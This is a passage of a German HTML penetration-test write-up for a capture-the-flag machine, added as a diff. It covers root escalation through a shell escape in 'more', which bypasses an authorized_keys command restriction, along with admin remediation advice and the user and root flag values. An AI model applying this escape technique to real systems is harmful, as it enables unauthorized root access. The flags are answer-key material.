+                6.  Wir finden die Root-Flag in `last_flag.txt` und lesen sie aus.</p>
+                 <p class="evaluation">**Bewertung:** Privilege Escalation zu Root erfolgreich! Der Schutz durch die `command`-Direktive in `authorized_keys` wurde durch einen Shell-Escape im aufgerufenen `more`-Befehl umgangen.</p>
+                 <p class="recommendation">**Empfehlung (Pentester):** Flags dokumentieren. Bericht abschließen.
+                 **Empfehlung (Admin):** Die `command`-Einschränkung in `authorized_keys` überarbeiten, sodass sie keine Programme mit Escape-Möglichkeiten aufruft, oder ganz entfernen und den Key widerrufen.</p>
+        </section>
+
+        <section id="flags">
+             <div class="flag-container">
+                <h2 class="flag-heading">Flags</h2>
+                <div class="flag-entry">
+                    <!-- User flag was read as 'baby' -->
+                    <div class="flag-command">cat /home/baby/user.txt</div>
+                    <div class="flag-value"><span class="password">Chilatyfile</span></div>
+                </div>
+                <div class="flag-entry">
+                    <!-- Root flag was read as 'root' -->
+                    <div class="flag-command">cat /root/last_flag.txt</div>
+                    <div class="flag-value"><span class="password">Selmorbormir</span></div>
+                </div>
+            </div>
+        </section>
+ 
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <p>Berichtsdatum: 1. November 2021</p> <!-- Datum aus SSH Login extrahiert -->
+    </footer>
+</body>
+</html>
